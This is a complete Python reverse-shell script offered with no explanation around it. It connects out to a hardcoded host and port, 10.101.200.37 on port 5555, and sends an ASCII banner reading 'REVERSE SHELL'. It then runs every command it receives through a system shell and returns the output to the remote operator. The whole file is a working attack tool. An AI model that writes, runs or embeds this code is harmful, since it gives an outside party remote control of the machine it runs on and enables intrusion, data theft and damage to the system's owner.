import socket,subprocess,os, sys

def main():
	host = "10.101.200.37"
	port = 5555
	s=socket.socket()
	s.connect((host,port))
	dir_path = os.path.dirname(os.path.realpath(__file__))
	banner = """ 
			d8888b. d88888b db    db d88888b d8888b. .d8888. d88888b       .d8888. db   db d88888b db      db     
			88  `8D 88'     88    88 88'     88  `8D 88'  YP 88'           88'  YP 88   88 88'     88      88     
			88oobY' 88ooooo Y8    8P 88ooooo 88oobY' `8bo.   88ooooo       `8bo.   88ooo88 88ooooo 88      88     
			88`8b   88~~~~~ `8b  d8' 88~~~~~ 88`8b     `Y8b. 88~~~~~         `Y8b. 88~~~88 88~~~~~ 88      88     
			88 `88. 88.      `8bd8'  88.     88 `88. db   8D 88.           db   8D 88   88 88.     88booo. 88booo.
			88   YD Y88888P    YP    Y88888P 88   YD `8888Y' Y88888P       `8888Y' YP   YP Y88888P Y88888P Y88888P 
	"""
	
	s.send(u"\n")
	s.send(banner)
	s.send(u"\n")
	s.send(u"\n")
	
	
	while True:
		cmd = s.recv(99999)
		res = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE)
		res  = res.stdout.read() + res.stderr.read()
		s.send(res+dir_path+">")

main()